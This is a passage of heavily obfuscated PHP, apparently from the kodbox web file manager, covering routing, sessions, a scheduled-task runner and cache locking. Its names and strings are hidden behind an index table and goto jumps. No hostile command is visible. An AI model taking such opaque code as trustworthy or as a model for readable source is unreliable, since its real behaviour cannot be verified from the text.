ActionCall($÷ç£ªıù[1600], $Ó¤Üœ’ú[$ùŸöêÄƒ]); } public function url($ôÍ·åê, $¨ü¶åá = '', $ˆŞŠ«é¹ = true) { $õø…ŠÇ =& $_SERVER[”ú…±Ú¥]; $àæéÄçÑ = $this->getConfig(); $¸•Óèö¶ = KOD_VERSION . $õø…ŠÇ[10] . KOD_VERSION_BUILD; $¤¤„ÇÄ = $this->packageVersion(); $ÄÙÒÀ¦ô = $¸•Óèö¶ . $õø…ŠÇ[424] . $¤¤„ÇÄ; if (substr($ôÍ·åê, 0, 4) == $õø…ŠÇ[148] || substr($ôÍ·åê, 0, 2) == $õø…ŠÇ[1307]) { $ÃØ–ÑÅ = $ôÍ·åê . $õø…ŠÇ[1601] . $ÄÙÒÀ¦ô; } else { if ($¨ü¶åá == $õø…ŠÇ[12]) { $ÃØ–ÑÅ = $this->pluginHost . $ôÍ·åê . $õø…ŠÇ[1601] . $ÄÙÒÀ¦ô; } else { if ($¨ü¶åá === $õø…ŠÇ[75]) { $ÃØ–ÑÅ = $this->pluginHost . $ôÍ·åê; } else { if ($¨ü¶åá == $õø…ŠÇ[1602]) { $ÃØ–ÑÅ = STATIC_PATH . $ôÍ·åê . $õø…ŠÇ[1601] . $¸•Óèö¶; } else { if ($¨ü¶åá == $õø…ŠÇ[1603]) { $ÃØ–ÑÅ = APP_HOST . $õø…ŠÇ[1604] . $ôÍ·åê . $õø…ŠÇ[1601] . $¸•Óèö¶; } else { if (isset($àæéÄçÑ[$¨ü¶åá])) { $ÃØ–ÑÅ = $àæéÄçÑ[$¨ü¶åá] . $ôÍ·åê . $õø…ŠÇ[1601] . $ÄÙÒÀ¦ô; } } } } } } if (!$ˆŞŠ«é¹) { return $ÃØ–ÑÅ; } echo $ÃØ–ÑÅ; } public function link($­ê¼­ˆ€ = false, $•ùã¦Ë = '') { $ôôìîäÓ =& $_SERVER[”ú…±Ú¥]; if (!$­ê¼­ˆ€) { $this->link($ôôìîäÓ[1605], $ôôìîäÓ[1603]); $this->link($ôôìîäÓ[1606], $ôôìîäÓ[1602]); $this->link($ôôìîäÓ[1607], $ôôìîäÓ[1602]); $this->link($ôôìîäÓ[1608], $ôôìîäÓ[1602]); $this->link($ôôìîäÓ[1609], $ôôìîäÓ[1602]); return; } $¹×»ˆ´ = $this->url($­ê¼­ˆ€, $•ùã¦Ë, !1); if (substr($­ê¼­ˆ€, -3) == $ôôìîäÓ[1610]) { echo $ôôìîäÓ[1611] . $¹×»ˆ´ . $ôôìîäÓ[1612] . $ôôìîäÓ[191]; } else { if (substr($­ê¼­ˆ€, -4) == $ôôìîäÓ[1613]) { echo $ôôìîäÓ[1614] . $¹×»ˆ´ . $ôôìîäÓ[1615] . $ôôìîäÓ[191]; } } } } goto aŸ§¦Š›ÌÛ; aŸ§¦Š›ÌÛ: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\156\171" => "\133\x5e\57\135\53", "\x3a\x6e\x75\x6d" => "\x5b\x30\x2d\71\135\53", "\72\141\154\154" => "\56\52"); public static $errorCallback; public static function __callstatic($ªäøÄÇ, $—’Çİã×) { $ùû½®‡¬ =& $_SERVER[”ú…±Ú¥]; if ($ªäøÄÇ == $ùû½®‡¬[1616]) { $ÊÄ¶ó„á = array_map($ùû½®‡¬[1617], $—’Çİã×[0]); $§¡—ƒ§ = strpos($—’Çİã×[1], $ùû½®‡¬[8]) === 0 ? $—’Çİã×[1] : $ùû½®‡¬[8] . $—’Çİã×[1]; $ÚÌŠçôÃ = $—’Çİã×[2]; } else { $ÊÄ¶ó„á = null; $§¡—ƒ§ = strpos($—’Çİã×[0], $ùû½®‡¬[8]) === 0 ? $—’Çİã×[0] : $ùû½®‡¬[8] . $—’Çİã×[0]; $ÚÌŠçôÃ = $—’Çİã×[1]; } array_push(self::$maps, $ÊÄ¶ó„á); array_push(self::$routes, $§¡—ƒ§); array_push(self::$methods, strtoupper($ªäøÄÇ)); array_push(self::$callbacks, $ÚÌŠçôÃ); } public static function error($€öÄ©¼) { self::$errorCallback = $€öÄ©¼; } public static function haltOnMatch($¸ĞµÏ = true) { self::$halts = $¸ĞµÏ; } public static function dispatch() { $‚†êõÕæ =& $_SERVER[”ú…±Ú¥]; $²ñÒúê­ = parse_url($_SERVER[$‚†êõÕæ[1618]], PHP_URL_PATH); $Ï¤ß“¦è = $_SERVER[$‚†êõÕæ[159]]; $çŸÎ•–® = array_keys(static::$patterns); $”ş˜»ËÉ = array_values(static::$patterns); $€ˆúŠ®® = !1; self::$routes = preg_replace($‚†êõÕæ[1305], $‚†êõÕæ[8], self::$routes); if (in_array($²ñÒúê­, self::$routes)) { $ Ùã€Î = array_keys(self::$routes, $²ñÒúê­); foreach ($ Ùã€Î as $…°ï®õ) { if (self::$methods[$…°ï®õ] == $Ï¤ß“¦è || self::$methods[$…°ï®õ] == $‚†êõÕæ[1619] || in_array($Ï¤ß“¦è, self::$maps[$…°ï®õ])) { $€ˆúŠ®® = !0; if (!is_object(self::$callbacks[$…°ï®õ])) { $ŸÄ×ÍÚ = explode($‚†êõÕæ[8], self::$callbacks[$…°ï®õ]); $å©ûÇ½ = end($ŸÄ×ÍÚ); $‘æ®ßÒê = explode($‚†êõÕæ[1237], $å©ûÇ½); $¸°‚³ = new $‘æ®ßÒê[0](); $¸°‚³->{$‘æ®ßÒê[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$…°ï®õ]); if (self::$halts) { return; } } } } } else { $ä¾¼ù€‘ = 0; foreach (self::$routes as $…°ï®õ) { if (strpos($…°ï®õ, $‚†êõÕæ[4]) !== !1) { $…°ï®õ = str_replace($çŸÎ•–®, $”ş˜»ËÉ, $…°ï®õ); } if (preg_match($‚†êõÕæ[1620] . $…°ï®õ . $‚†êõÕæ[1621], $²ñÒúê­, $†·Æó‡œ)) { if (self::$methods[$ä¾¼ù€‘] == $Ï¤ß“¦è || self::$methods[$ä¾¼ù€‘] == $‚†êõÕæ[1619] || !empty(self::$maps[$ä¾¼ù€‘]) && in_array($Ï¤ß“¦è, self::$maps[$ä¾¼ù€‘])) { $€ˆúŠ®® = !0; array_shift($†·Æó‡œ); if (!is_object(self::$callbacks[$ä¾¼ù€‘])) { $ŸÄ×ÍÚ = explode($‚†êõÕæ[8], self::$callbacks[$ä¾¼ù€‘]); $å©ûÇ½ = end($ŸÄ×ÍÚ); $‘æ®ßÒê = explode($‚†êõÕæ[1237], $å©ûÇ½); $¸°‚³ = new $‘æ®ßÒê[0](); if (!method_exists($¸°‚³, $‘æ®ßÒê[1])) { echo $‚†êõÕæ[1622]; } else { call_user_func_array(array($¸°‚³, $‘æ®ßÒê[1]), $†·Æó‡œ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$ä¾¼ù€‘], $†·Æó‡œ); if (self::$halts) { return; } } } } $ä¾¼ù€‘++; } } if ($€ˆúŠ®® == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $õõ¡ƒ“’ =& $_SERVER[”ú…±Ú¥]; header($_SERVER[$õõ¡ƒ“’[1623]] . $õõ¡ƒ“’[1624]); echo $õõ¡ƒ“’[1625]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$‚†êõÕæ[1618]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $İôÖà…¶ =& $_SERVER[”ú…±Ú¥]; static $ÄªÎñ›¥ = false; if ($ÄªÎñ›¥) { return $ÄªÎñ›¥; } $úéÂ£“† = $GLOBALS[$İôÖà…¶[6]][$İôÖà…¶[387]]; self::$sessionTime = $úéÂ£“†[$İôÖà…¶[1626]]; $¯Øâ¾Üò = isset($GLOBALS[$İôÖà…¶[1627]]) ? $GLOBALS[$İôÖà…¶[1627]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($¯Øâ¾Üò)) { self::$sessionSign = Cookie::get($¯Øâ¾Üò); } else { self::$sessionSign = guid(); } } Cookie::setSafe($¯Øâ¾Üò, self::$sessionSign, self::$sessionTime); $ŠÚÇ”õ = $úéÂ£“†[$İôÖà…¶[1628]]; $³çœˆ²÷ = $úéÂ£“†[$ŠÚÇ”õ]; $Ç»×¿—ß = $úéÂ£“†[$İôÖà…¶[860]]; switch ($ŠÚÇ”õ) { case $İôÖà…¶[21]: self::$handle = Model($İôÖà…¶[861]); break; case $İôÖà…¶[862]: self::$handle = new CacheRedis($³çœˆ²÷, $Ç»×¿—ß); break; case $İôÖà…¶[863]: self::$handle = new CacheMemcached($³çœˆ²÷, $Ç»×¿—ß); break; case $İôÖà…¶[210]: $³çœˆ²÷[$İôÖà…¶[84]] = $³çœˆ²÷[$İôÖà…¶[84]] . $İôÖà…¶[1629]; self::$handle = new CacheFile($³çœˆ²÷, $Ç»×¿—ß); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ÄªÎñ›¥ = new self(); return $ÄªÎñ›¥; } public static function getBySign($¤«áí†é) { $âÈ˜êÉï = self::$handle->get($¤«áí†é); $âÈ˜êÉï = unserialize($âÈ˜êÉï); return is_array($âÈ˜êÉï) ? $âÈ˜êÉï : array(); } public static function setBySign($¬åâœ«Å, $åùÖ‘’) { CacheLock::lock($¬åâœ«Å); self::$handle->set($¬åâœ«Å, serialize($åùÖ‘’), self::$sessionTime); CacheLock::unlock($¬åâœ«Å); } public static function sign($î’ñ¬Ó = false) { $î’ñ¬Ó && (self::$sessionSign = $î’ñ¬Ó); self::init(); return self::$sessionSign; } public static function set($èÄØ‡‡Ñ, $Ú»ô§ƒ = false) { self::init(); if (is_array($èÄØ‡‡Ñ)) { foreach ($èÄØ‡‡Ñ as $İà¶Áö· => $°«üî¬¦) { array_set_value(self::$data, $İà¶Áö·, $°«üî¬¦); } } else { array_set_value(self::$data, $èÄØ‡‡Ñ, $Ú»ô§ƒ); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ÖÌÓ‰ì’ = false) { self::init(); if (!$ÖÌÓ‰ì’) { return self::$data; } return array_get_value(self::$data, $ÖÌÓ‰ì’); } public static function remove($œÈ¡°ƒ¥) { self::init(); unset(self::$data[$œÈ¡°ƒ¥]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[”ú…±Ú¥][865])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $˜ãëôìÃ =& $_SERVER[”ú…±Ú¥]; if (self::valueGet($˜ãëôìÃ[782]) != $˜ãëôìÃ[88]) { return; } if (self::valueGet($˜ãëôìÃ[1630]) == $˜ãëôìÃ[88]) { $§ÄĞ´È” = self::valueGet($˜ãëôìÃ[1631]); if (time() - $§ÄĞ´È” > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); $GLOBALS[$˜ãëôìÃ[1632]] = 1; self::valueSet($˜ãëôìÃ[1630], $˜ãëôìÃ[88]); self::log($˜ãëôìÃ[1633] . ACTION . $˜ãëôìÃ[1634]); Session::$data = array(); Session::$sessionSign = $˜ãëôìÃ[12]; $GLOBALS[$˜ãëôìÃ[532]] = 1; Hook::bind($˜ãëôìÃ[1635], $˜ãëôìÃ[1636]); $€…²åüØ = 0; while (!0) { self::cacheClear(); if (self::valueGet($˜ãëôìÃ[782]) != $˜ãëôìÃ[88]) { self::valueSet($˜ãëôìÃ[1630], $˜ãëôìÃ[208]); self::log($˜ãëôìÃ[1637]); die; } $‚Éè”ïö = time(); if ($‚Éè”ïö - $€…²åüØ >= 60) { self::valueSet(array($˜ãëôìÃ[1630] => $˜ãëôìÃ[88], $˜ãëôìÃ[1631] => $‚Éè”ïö), !1); $€…²åüØ = $‚Éè”ïö; } if (!file_exists(USER_SYSTEM . $˜ãëôìÃ[1638])) { self::valueSet(array($˜ãëôìÃ[1630] => $˜ãëôìÃ[208], $˜ãëôìÃ[782] => $˜ãëôìÃ[208]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $–¯ÂŒãñ =& $_SERVER[”ú…±Ú¥]; http_close(); self::valueSet($–¯ÂŒãñ[782], $–¯ÂŒãñ[208]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($–¯ÂŒãñ[1630] => $–¯ÂŒãñ[208], $–¯ÂŒãñ[782] => $–¯ÂŒãñ[88]), !1); } public static function taskSwitch() { $ê“¾´Ü‘ =& $_SERVER[”ú…±Ú¥]; $¼ºóÇğ = self::valueGet($ê“¾´Ü‘[782]) == $ê“¾´Ü‘[88] ? $ê“¾´Ü‘[208] : $ê“¾´Ü‘[88]; self::valueSet($ê“¾´Ü‘[782], $¼ºóÇğ); } public static function shutdownEvent() { $àÄ¯œ” =& $_SERVER[”ú…±Ú¥]; self::valueSet($àÄ¯œ”[1630], $àÄ¯œ”[208]); self::log($àÄ¯œ”[1639]); } public static function config($±Æğ¨†€, $°Ó™ÙµÜ) { self::valueSet($_SERVER[”ú…±Ú¥][782], $±Æğ¨†€); } private static function taskRunAll() { $¶ŠÙÚí =& $_SERVER[”ú…±Ú¥]; $´®¼¿†Ö = timeFloat(); $ªÉùã¤õ = Model($¶ŠÙÚí[1640])->listData(); $–Ã—Ø£Ä = count($ªÉùã¤õ); for ($ö×ÉÏË’ = 0; $ö×ÉÏË’ < $–Ã—Ø£Ä; $ö×ÉÏË’++) { $ Ø‡õÓŞ = $ªÉùã¤õ[$ö×ÉÏË’]; if (!$ Ø‡õÓŞ[$¶ŠÙÚí[437]] || $ Ø‡õÓŞ[$¶ŠÙÚí[1641]] != $¶ŠÙÚí[88]) { continue; } if (!self::taskTimeCheck($ Ø‡õÓŞ)) { continue; } self::taskRun($ Ø‡õÓŞ); } Hook::trigger($¶ŠÙÚí[1642]); self::taskQueueRun($´®¼¿†Ö); } private static function taskQueueRun($ËÌæ‹î) { $è±Ë—õ = 10; while (!0) { $£ßŞ×Ş¿ = TaskQueue::run(); if ($£ßŞ×Ş¿ === !1) { break; } if (timeFloat() - $ËÌæ‹î >= $è±Ë—õ) { break; } } } private static function taskTimeCheck($ïÅÛûÄÎ) { $¡Ÿñ›‚ =& $_SERVER[”ú…±Ú¥]; $öö°Ô­ = json_decode($ïÅÛûÄÎ[$¡Ÿñ›‚[180]], !0); $¦Ûä¢¨… = intval($ïÅÛûÄÎ[$¡Ÿñ›‚[1631]]); $û³çŠÛİ = strtotime($¡Ÿñ›‚[1643] . $öö°Ô­[$¡Ÿñ›‚[1644]] . $¡Ÿñ›‚[1645]) - strtotime($¡Ÿñ›‚[1646]); $µ©Ÿ‘Ğ¦ = time() - strtotime(date($¡Ÿñ›‚[1647]) . $¡Ÿñ›‚[1648]); $¿âËÆ¤± = $µ©Ÿ‘Ğ¦ >= $û³çŠÛİ && $µ©Ÿ‘Ğ¦ <= $û³çŠÛİ + 3600; switch ($öö°Ô­[$¡Ÿñ›‚[33]]) { case $¡Ÿñ›‚[1649]: if (time() - $¦Ûä¢¨… < 3600 * 24 * 30) { return !1; } if ($öö°Ô­[$¡Ÿñ›‚[1649]] == date($¡Ÿñ›‚[1650]) && $¿âËÆ¤±) { return !0; } break; case $¡Ÿñ›‚[1651]: if (time() - $¦Ûä¢¨… < 3600 * 24 * 7) { return !1; } $÷œ›Á¢ = date($¡Ÿñ›‚[1652]) == 0 ? 7 : date($¡Ÿñ›‚[1652]); if ($öö°Ô­[$¡Ÿñ›‚[1651]] == $÷œ›Á¢ && $¿âËÆ¤±) { return !0; } break; case $¡Ÿñ›‚[1644]: if (time() - $¦Ûä¢¨… < 3600 * 24) { return !1; } if ($¿âËÆ¤±) { return !0; } break; case $¡Ÿñ›‚[1653]: if (time() - $¦Ûä¢¨… >= floatval($öö°Ô­[$¡Ÿñ›‚[1653]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $ä¾‚ü¶‘ =& $_SERVER[”ú…±Ú¥]; static $§÷˜Ëâ€ = 0; $üîÜÜêâ = 300; if (!$§÷˜Ëâ€) { $§÷˜Ëâ€ = time(); } if (time() - $§÷˜Ëâ€ < $üîÜÜêâ) { return; } $§÷˜Ëâ€ = time(); $çù˜å–ñ = Model($ä¾‚ü¶‘[542])->db($ä¾‚ü¶‘[12]); if ($çù˜å–ñ) { $çù˜å–ñ->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($ä¾‚ü¶‘[1654], $ä¾‚ü¶‘[1655]); die; } } public static function taskRun($şŞ—×š¾) { $¿ç…³÷‡ =& $_SERVER[”ú…±Ú¥]; self::log($¿ç…³÷‡[1656] . $şŞ—×š¾[$¿ç…³÷‡[437]] . $¿ç…³÷‡[1657] . $şŞ—×š¾[$¿ç…³÷‡[32]] . $¿ç…³÷‡[1658] . $şŞ—×š¾[$¿ç…³÷‡[1659]]); Model($¿ç…³÷‡[1640])->run($şŞ—×š¾[$¿ç…³÷‡[437]]); $Ù÷ìÉ²› = timeFloat(); $Ó±¨©ç = $¿ç…³÷‡[12]; switch ($şŞ—×š¾[$¿ç…³÷‡[33]]) { case $¿ç…³÷‡[345]: $ùìæŸ˜÷ = url_request($şŞ—×š¾[$¿ç…³÷‡[1659]], $¿ç…³÷‡[240], !1, !1, !1, !1, 10); if ($ùìæŸ˜÷[$¿ç…³÷‡[782]]) { $Ó±¨©ç = strlen($ùìæŸ˜÷[$¿ç…³÷‡[1231]]); } break; case $¿ç…³÷‡[239]: $Ó±¨©ç = Hook::apply($şŞ—×š¾[$¿ç…³÷‡[1659]]); default: break; } Model($¿ç…³÷‡[1660])->add(array($¿ç…³÷‡[1661] => $¿ç…³÷‡[12], $¿ç…³÷‡[1662] => $¿ç…³÷‡[208], $¿ç…³÷‡[33] => $¿ç…³÷‡[1663] . $şŞ—×š¾[$¿ç…³÷‡[437]], $¿ç…³÷‡[1664] => json_encode(array($¿ç…³÷‡[32] => $şŞ—×š¾[$¿ç…³÷‡[32]], $¿ç…³÷‡[1665] => timeFloat() - $Ù÷ìÉ²›, $¿ç…³÷‡[331] => $Ó±¨©ç)))); $í‰àİº = $Ó±¨©ç ? $¿ç…³÷‡[1666] . $Ó±¨©ç : $¿ç…³÷‡[12]; self::log($¿ç…³÷‡[1667] . $şŞ—×š¾[$¿ç…³÷‡[437]] . $¿ç…³÷‡[164] . $í‰àİº); return !0; } private static function valueGet($ öÕÊ‡) { $ùˆ‚¢û³ =& $_SERVER[”ú…±Ú¥]; $±™¾ÈÇŸ = $ùˆ‚¢û³[1668]; $µÉ¢÷Ô = Model($ùˆ‚¢û³[473])->get($ öÕÊ‡, $±™¾ÈÇŸ); if (is_null($µÉ¢÷Ô)) { Model($ùˆ‚¢û³[473])->set($ùˆ‚¢û³[782], $ùˆ‚¢û³[88], $±™¾ÈÇŸ); Model($ùˆ‚¢û³[473])->set($ùˆ‚¢û³[1630], $ùˆ‚¢û³[208], $±™¾ÈÇŸ); $µÉ¢÷Ô = Model($ùˆ‚¢û³[473])->get($ öÕÊ‡, $±™¾ÈÇŸ); } return $µÉ¢÷Ô; } private static function valueSet($¦‹ÜÛÎè, $À˜Ğå¦») { $¬ÜûšÜö =& $_SERVER[”ú…±Ú¥]; $°ÕÛïéÖ = $¬ÜûšÜö[1669]; CacheLock::lock($°ÕÛïéÖ); $À¿àª‚ = Model($¬ÜûšÜö[473])->set($¦‹ÜÛÎè, $À˜Ğå¦», $¬ÜûšÜö[1668]); CacheLock::unlock($°ÕÛïéÖ); return $À¿àª‚; } protected static function log($ø­©ü®à) { write_log($ø­©ü®à, $_SERVER[”ú…±Ú¥][1655]); } private static function cacheClear() { $÷‡½å¾Ö =& $_SERVER[”ú…±Ú¥]; Cache::clearMemory(Model($÷‡½å¾Ö[473])->cacheKey($÷‡½å¾Ö[1668])); Cache::clearMemory(Model($÷‡½å¾Ö[473])->cacheKey($÷‡½å¾Ö[1670])); Model($÷‡½å¾Ö[1640])->cacheClear(); self::closeDatabase(); } } goto FŸ«²ŸÀãÏ; Cá²ÇƒËò: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($¦ÇøÈÏÜ, $â…¸åÇÄ) { $ÏÎ»„¨ =& $_SERVER[”ú…±Ú¥]; $this->cachePath = $¦ÇøÈÏÜ[$ÏÎ»„¨[84]]; $this->prefix = $ÏÎ»„¨[866]; $this->cacheTime = $â…¸åÇÄ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($Üò’‹—à) { $œÖÈ°‰Ò =& $_SERVER[”ú…±Ú¥]; $Üò’‹—à = str_replace(array($œÖÈ°‰Ò[867], $œÖÈ°‰Ò[97], $œÖÈ°‰Ò[73]), $œÖÈ°‰Ò[868], $Üò’‹—à); return $this->cachePath . $œÖÈ°‰Ò[869] . $Üò’‹—à . $œÖÈ°‰Ò[870]; } public function set($¶Á„Û·, $ÇåÉ˜Å÷, $Ùƒ­ÚæÂ = false) { $Ùƒ­ÚæÂ = $Ùƒ­ÚæÂ ? $Ùƒ­ÚæÂ : $this->cacheTime; $ŒÃ†òÀ = $this->getFile($¶Á„Û·); if (file_put_contents($ŒÃ†òÀ, $this->prefix . $ÇåÉ˜Å÷, LOCK_EX)) { @touch($ŒÃ†òÀ, intval(time() + $Ùƒ­ÚæÂ)); clearstatcache(); return !0; } @unlink($ŒÃ†òÀ); return !1; } public function get($ßûØãÎ€) { $­»Êòç = $this->getFile($ßûØãÎ€); if (file_exists($­»Êòç) && filemtime($­»Êòç) < time()) { @unlink($­»Êòç); return !1; } $œ ô¦¾ = @file_get_contents($­»Êòç); return substr($œ ô¦¾, strlen($this->prefix)); } public function remove($ûè“Öğ¡) { $´“ã«Ä“ = $this->getFile($ûè“Öğ¡); return @unlink($´“ã«Ä“); } public function deleteAll() { $¤¬­ Í· =& $_SERVER[”ú…±Ú¥]; $¼ÖÄ¤æï = scandir($this->cachePath); foreach ($¼ÖÄ¤æï as $å„™İÛë) { $×Åä»«Î = $this->cachePath . $å„™İÛë; if (strpos($×Åä»«Î, $¤¬­ Í·[870]) && strpos($×Åä»«Î, $¤¬­ Í·[871])) { @unlink($×Åä»«Î); } } } public function clearTimeout() { $÷öŞèĞî =& $_SERVER[”ú…±Ú¥]; $ô¤Şİë¤ = scandir($this->cachePath); foreach ($ô¤Şİë¤ as $˜ˆé¦×ö) { $šÃ•èÜÉ = $this->cachePath . $˜ˆé¦×ö; if (strpos($šÃ•èÜÉ, $÷öŞèĞî[870]) && strpos($šÃ•èÜÉ, $÷öŞèĞî[871]) && filemtime($šÃ•èÜÉ) < time()) { @unlink($šÃ•èÜÉ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $íÒ»™»Š =& $_SERVER[”ú…±Ú¥]; if (self::$handle) { return self::$handle; } $ç®ŒŒ¡ = $GLOBALS[$íÒ»™»Š[6]][$íÒ»™»Š[387]]; self::$timeout = $ç®ŒŒ¡[$íÒ»™»Š[872]] ? $ç®ŒŒ¡[$íÒ»™»Š[872]] : 10; $ÃÎ„»ĞÛ = _get($GLOBALS[$íÒ»™»Š[6]], $íÒ»™»Š[873]); $ÊÚ¶ÆŒ = $ç®ŒŒ¡[$íÒ»™»Š[859]] ? $ç®ŒŒ¡[$íÒ»™»Š[859]] : $íÒ»™»Š[210]; if ($ÊÚ¶ÆŒ == $íÒ»™»Š[21] && $ÃÎ„»ĞÛ == $íÒ»™»Š[13]) { $ÊÚ¶ÆŒ = $íÒ»™»Š[210]; } switch ($ÊÚ¶ÆŒ) { case $íÒ»™»Š[862]: self::$handle = new CacheLockRedis(); break; case $íÒ»™»Š[863]: self::$handle = new CacheLockMemcached(); break; case $íÒ»™»Š[21]: self::$handle = new CacheLockDatabase(); break; case $íÒ»™»Š[210]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($íÒ»™»Š[874], $íÒ»™»Š[875]); } return self::$handle; } private static function key($ŞëıÅÌÒ) { return $_SERVER[”ú…±Ú¥][876] . Cache::key($ŞëıÅÌÒ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($½’í²Õš = '') { self::$errorMsg = $½’í²Õš; } public static function lockGlobal($²ÀÇ÷Ş÷, $ÚíÎß©Ø) { return self::lock($²ÀÇ÷Ş÷, $ÚíÎß©Ø, !0); } public static function lock($’Ãççß, $úš±ïø = false, $ŸµËÇ•º = false) { $Çä¿÷ó» =& $_SERVER[”ú…±Ú¥]; $‹éŠ‡¬· = self::init(); $úĞ–¤ªÉ = self::key($’Ãççß); $úš±ïø = $úš±ïø ? $úš±ïø : self::$timeout; $¦°­ƒÔ‡ = timeFloat(); $„­òØÒ¾ = $‹éŠ‡¬·->lock($úĞ–¤ªÉ, $úš±ïø); $™ÒŞìÉ = timeFloat(); if (!$„­òØÒ¾) { $··ÂÒÔÅ = "\x6c\157\x63\x6b\x20\145\162\x72\157\162\73\153\x65\x79\x3d{$’Ãççß}\73\164\151\x6d\x65\x3d{$úš±ïø}\73" . self::$errorMsg . $Çä¿÷ó»[71] . get_caller_msg(); $„ñÑ¯—Û = LNG($Çä¿÷ó»[877]) . "\x28{$úš±ïø}\163\51\56" . LNG($Çä¿÷ó»[878]); $„ñÑ¯—Û .= $Çä¿÷ó»[879]; if (is_string(self::$errorMsg) && self::$errorMsg) { $„ñÑ¯—Û = $„ñÑ¯—Û . $Çä¿÷ó»[880] . self::$errorMsg; } write_log($Çä¿÷ó»[881] . sprintf($Çä¿÷ó»[882], timeFloat() - $¦°­ƒÔ‡) . $Çä¿÷ó»[883] . $··ÂÒÔÅ . $Çä¿÷ó»[884] . error_get_last(), $Çä¿÷ó»[875]); show_json($„ñÑ¯—Û, !1); } if (!$ŸµËÇ•º) { self::$lockItem[$úĞ–¤ªÉ] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $¸ö¢¤åİ = number_format(timeFloat() - $™ÒŞìÉ, 3); write_log($Çä¿÷ó»[885] . $’Ãççß . $Çä¿÷ó»[886] . $¸ö¢¤åİ, $Çä¿÷ó»[875]); } return $„­òØÒ¾; } public static function lockGet($Õ´Š—Ëö) { $Ù­£æ…â = self::key($Õ´Š—Ëö); if (self::$lockItem[$Ù­£æ…â]) { return self::$lockItem[$Ù­£æ…â]; } return self::init()->lockGet($Ù­£æ…â); } public static function unlock($‡·Ÿ‰¢) { $ÊÖÙ«ÂŒ =& $_SERVER[”ú…±Ú¥]; $ÊÈ¹–î§ = self::key($‡·Ÿ‰¢); self::$lockItem[$ÊÈ¹–î§] = null; self::init()->unlock($ÊÈ¹–î§); if (GLOBAL_DEBUG_LOG_ALL) { write_log($ÊÖÙ«ÂŒ[887] . $‡·Ÿ‰¢, $ÊÖÙ«ÂŒ[875]); } return; } public static function unlockRuntime() { $ŞÍ•İÇÜ =& $_SERVER[”ú…±Ú¥]; $ØüéÛè„ = self::init(); $—Ô…Æ’ = !1; foreach (self::$lockItem as $Æ½ğæ¨ => $¤€Ñˆò) { if (!$¤€Ñˆò) { continue; } $ØüéÛè„->unlock($Æ½ğæ¨); if (!$—Ô…Æ’) { $—Ô…Æ’ = !0; write_log($ŞÍ•İÇÜ[888] . $Æ½ğæ¨ . $ŞÍ•İÇÜ[71] . get_caller_msg(), $ŞÍ•İÇÜ[875]); continue; } write_log($ŞÍ•İÇÜ[888] . $Æ½ğæ¨, $ŞÍ•İÇÜ[875]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $‹ˆö½Â = number_format(timeFloat() - TIME_FLOAT, 3); write_log($ŞÍ•İÇÜ[889] . $‹ˆö½Â . $ŞÍ•İÇÜ[890] . ACTION, $ŞÍ•İÇÜ[875]); } } public static function fileLock($¤ÒÎñ¯) { $şÀ¡îÌ“ =& $_SERVER[”ú…±Ú¥]; if (!$GLOBALS[$şÀ¡îÌ“[891]]) { $GLOBALS[$şÀ¡îÌ“[891]] = array(); } $GLOBALS[$şÀ¡îÌ“[891]][$¤ÒÎñ¯] = !1; $ƒèó‚Ğ¿ = fopen(DATA_PATH . $¤ÒÎñ¯ . $şÀ¡îÌ“[892], $şÀ¡îÌ“[893]); if (!$ƒèó‚Ğ¿) { return !1; } $GLOBALS[$şÀ¡îÌ“[891]][$¤ÒÎñ¯] = $ƒèó‚Ğ¿; if (flock($ƒèó‚Ğ¿, LOCK_EX)) { return !0; } self::unlock($¤ÒÎñ¯); show_json($şÀ¡îÌ“[894], !1); return !1; } public static function fileUnlock($ÊÃô…) { $ã˜œ¹ =& $_SERVER[”ú…±Ú¥]; $¸ç¶®ôŸ = $GLOBALS[$ã˜œ¹[891]][$ÊÃô…]; if (!$¸ç¶®ôŸ) { return; } $GLOBALS[$ã˜œ¹[891]][$ÊÃô…] = !1; flock($¸ç¶®ôŸ, LOCK_UN); fclose($¸ç¶®ôŸ); } public static function fileUnlockAll() { $¿Í€ãƒ =& $_SERVER[”ú…±Ú¥]; if (!$GLOBALS[$¿Í€ãƒ[891]]) { return; } foreach ($GLOBALS[$¿Í€ãƒ[891]] as $è±§¯¸Ğ => $™»õÙÊ›) { if (!$™»õÙÊ›) { continue; } $GLOBALS[$¿Í€ãƒ[891]][$è±§¯¸Ğ] = !1; flock($™»õÙÊ›, LOCK_UN); fclose($™»õÙÊ›); } $GLOBALS[$¿Í€ãƒ[891]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto cÛğ¦£‰; aö³¶©«ñÄ: 